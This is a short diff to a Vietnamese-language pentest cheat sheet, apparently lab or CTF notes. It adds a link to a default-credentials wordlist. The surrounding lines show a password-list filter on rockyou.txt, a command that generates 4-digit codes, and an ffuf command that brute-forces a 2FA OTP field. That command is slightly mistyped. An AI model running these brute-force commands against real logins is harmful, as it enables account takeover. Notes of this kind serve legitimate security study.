@@ -7,3 +7,4 @@ Danh sách username : https://github.com/danielmiessler/SecLists/tree/master/Use
 Filter theo regex : awk 'length($0) >= 10 && /[A-Z]/ && /[a-z]/ && /[0-9]/' rockyou.txt > pass_da_loc.txt 
 Lệnh tạo ra các ký tự: seq -w 1 9999 ( cờ -w đảm bảo ra có cùng số lượng ký tự)
 Brute force với ffuf : fuf -w file_name -u target_host -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "session" -d "otp=FUZZ" -fr "Invalid 2FA Code
+Default credentials : https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
